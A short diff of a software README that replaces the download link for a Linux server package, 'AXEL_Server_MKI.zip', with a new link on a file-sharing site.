@@ -17,7 +17,7 @@ Please check if yor hardware is compatible and install the required software. In
 [Download](https://www.transferxl.com/download/08vqpy0dF9SdKz) 
 
 **Server (Linux 🔗)**  
-[Download](https://filecente.com/download/sguAewLJhPR4xNa/o7d5GLkazxRJn/AXEL_Server_MKI.zip) <!--https://filecente.com/sguAewLJhPR4xNa/file-->
+[Download](https://filecente.com/download/Uqho2axzczV4PZV/EQN9mElLG6dW1/AXEL_Server_LINUX_MKI.zip) <!--https://filecente.com/Uqho2axzczV4PZV/file-->
 
 ---
 ## Installation (Linux)
